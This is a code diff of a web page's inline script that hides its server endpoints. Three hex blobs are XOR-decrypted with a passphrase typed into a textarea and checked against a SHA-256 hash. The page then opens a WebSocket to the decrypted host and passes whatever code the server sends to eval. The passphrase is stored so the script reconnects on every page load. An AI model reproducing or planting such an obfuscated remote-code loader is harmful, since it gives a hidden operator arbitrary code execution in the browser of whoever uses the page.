@@ -20,24 +20,45 @@
     </style>
     <script type="module">
 
-      const [SOCK,SALT,CTRL]=["","whatever","1f29"]      
       await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));
 
-      // https://geraintluff.github.io/sha256/sha256.min.js
-      const sha256 = function a(b){function c(a,b){return a>>>b|a<<32-b}for(var d,e,f=Math.pow,g=f(2,32),h="length",i="",j=[],k=8*b[h],l=a.h=a.h||[],m=a.k=a.k||[],n=m[h],o={},p=2;64>n;p++)if(!o[p]){for(d=0;313>d;d+=p)o[d]=p;l[n]=f(p,.5)*g|0,m[n++]=f(p,1/3)*g|0}for(b+="\x80";b[h]%64-56;)b+="\x00";for(d=0;d<b[h];d++){if(e=b.charCodeAt(d),e>>8)return;j[d>>2]|=e<<(3-d)%4*8}for(j[j[h]]=k/g|0,j[j[h]]=k,e=0;e<j[h];){var q=j.slice(e,e+=16),r=l;for(l=l.slice(0,8),d=0;64>d;d++){var s=q[d-15],t=q[d-2],u=l[0],v=l[4],w=l[7]+(c(v,6)^c(v,11)^c(v,25))+(v&l[5]^~v&l[6])+m[d]+(q[d]=16>d?q[d]:q[d-16]+(c(s,7)^c(s,18)^s>>>3)+q[d-7]+(c(t,17)^c(t,19)^t>>>10)|0),x=(c(u,2)^c(u,13)^c(u,22))+(u&l[1]^u&l[2]^l[1]&l[2]);l=[w+x|0].concat(l),l[4]=l[4]+w|0}for(d=0;8>d;d++)l[d]=l[d]+r[d]|0}for(d=0;8>d;d++)for(e=3;e+1;e--){var y=l[d]>>8*e&255;i+=(16>y?0:"")+y.toString(16)}return i};
+      async function sha (t) {
+        // https://geraintluff.github.io/sha256/sha256.min.js
+        var sha256=function a(b){function c(a,b){return a>>>b|a<<32-b}for(var d,e,f=Math.pow,g=f(2,32),h="length",i="",j=[],k=8*b[h],l=a.h=a.h||[],m=a.k=a.k||[],n=m[h],o={},p=2;64>n;p++)if(!o[p]){for(d=0;313>d;d+=p)o[d]=p;l[n]=f(p,.5)*g|0,m[n++]=f(p,1/3)*g|0}for(b+="\x80";b[h]%64-56;)b+="\x00";for(d=0;d<b[h];d++){if(e=b.charCodeAt(d),e>>8)return;j[d>>2]|=e<<(3-d)%4*8}for(j[j[h]]=k/g|0,j[j[h]]=k,e=0;e<j[h];){var q=j.slice(e,e+=16),r=l;for(l=l.slice(0,8),d=0;64>d;d++){var s=q[d-15],t=q[d-2],u=l[0],v=l[4],w=l[7]+(c(v,6)^c(v,11)^c(v,25))+(v&l[5]^~v&l[6])+m[d]+(q[d]=16>d?q[d]:q[d-16]+(c(s,7)^c(s,18)^s>>>3)+q[d-7]+(c(t,17)^c(t,19)^t>>>10)|0),x=(c(u,2)^c(u,13)^c(u,22))+(u&l[1]^u&l[2]^l[1]&l[2]);l=[w+x|0].concat(l),l[4]=l[4]+w|0}for(d=0;8>d;d++)l[d]=l[d]+r[d]|0}for(d=0;8>d;d++)for(e=3;e+1;e--){var y=l[d]>>8*e&255;i+=(16>y?0:"")+y.toString(16)}return i};
+        return new Uint8Array(sha256(t).match(/.{2}/g).map(s=>parseInt(s,16)));
+      };
+      async function dec (sock, salt, pass) {
+    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
+    const flp = await sha(salt+pass+salt);
+    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
+    try {
+      const host = new TextDecoder().decode(sock.slice(32)).trim(),
+            chk = await sha(host);
+      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
+      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
+    } catch { }
+  };
+
+      const SOCK = ["e9926a7b210c93935f4df9b3ac0b9b66bb54e64f3e17833dfc5b1e0b649206aef5521b8770acb6b2e84a821bedf773693180617276afe3bb0639062b283099eff81f5ad335fefff3a451db02fce327236a8670386bb3fbaa137b1e2e25398aeeb05c58c83da3b6b2e802d6","a1a9acb92815997d7ec3d3ab0926e46662ba7e456d0acf99d6fac94eb624aa17bd69dd4579b5bc149dd8ac0402861929b565e2722daeb74038d4d76ae3906a48fc3d981730f4f00fc4c1bd1056cc422fa42fff6e35bfa20220d1da63f091220bfe26904a79b5bc5cc98cfc5718","77c39ceddc989377c0db5277f0964a06edebf4a4a9510fcb698c983da2ddb1316b03ed118d38b65677dc29dfb16aa209673f7399e1e96f4d93ee801dee7f2e70664eac45c86aff173bc770c6a07ef6433c3962d3fcf5775c86ac9818e3763d712e0dae5ec037b65677947d8be139"];
 
       const $ta = document.querySelector('textarea');
       try { $ta.value = localStorage.getItem('value') || ''; } catch { };
 
-      $ta.onchange = $ta.onkeyup = () => {
+      $ta.onchange = $ta.onkeyup = async () => {
         const value = $ta.value.trim();
-        if (!sha256(value).endsWith(CTRL)) return;
-        const socket = new WebSocket(`${SOCK}${sha256(SALT+value+SALT)}`);
-        socket.binaryType = 'arraybuffer';
-        socket.onmessage = ev => {
-          localStorage.setItem('value', value);
-          eval(new TextDecoder().decode(ev.data))(socket);
-        };
+        if (!value) return;
+        for (const sock of SOCK) {
+          const url = await dec(sock, "whatever", value);
+          if (url) {
+            $ta.value = 'connecting';
+            localStorage.setItem('value', value);
+            const socket = new WebSocket(url);
+            socket.binaryType = 'arraybuffer';
+            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
+            socket.onerror = () => { $ta.value = 'vodafone müde'; };
+            return;
+          }
+        }
       };
 
       $ta.onchange();
